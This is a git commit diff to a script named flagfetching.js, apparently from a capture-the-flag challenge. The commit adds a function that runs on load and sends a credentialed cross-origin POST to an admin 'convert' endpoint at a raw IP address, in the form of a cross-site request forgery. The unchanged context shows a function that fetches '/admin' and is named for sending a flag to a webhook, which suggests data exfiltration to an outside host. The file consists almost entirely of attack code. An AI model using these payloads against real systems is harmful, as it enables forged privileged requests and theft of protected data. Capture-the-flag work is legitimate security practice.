0a5db404050b694d759a53446d6c7dec3f7affd7
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2023-04-28 16:33:19 +0530

    Update flagfetching.js

--- flagfetching.js
+++ flagfetching.js
@@ -1,3 +1,20 @@
+function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/54.180.108.161\/admin\/convert", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application\/json");
+        xhr.withCredentials = true;
+        var body = "{\"htmlCode\":\"\x3ch1\x3etesting\x3c/h1\x3e\"}";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+submitRequest();
+
+
 async function sendFlagToWebhook(webhookUrl) {
   try {
     const response = await fetch('/admin');
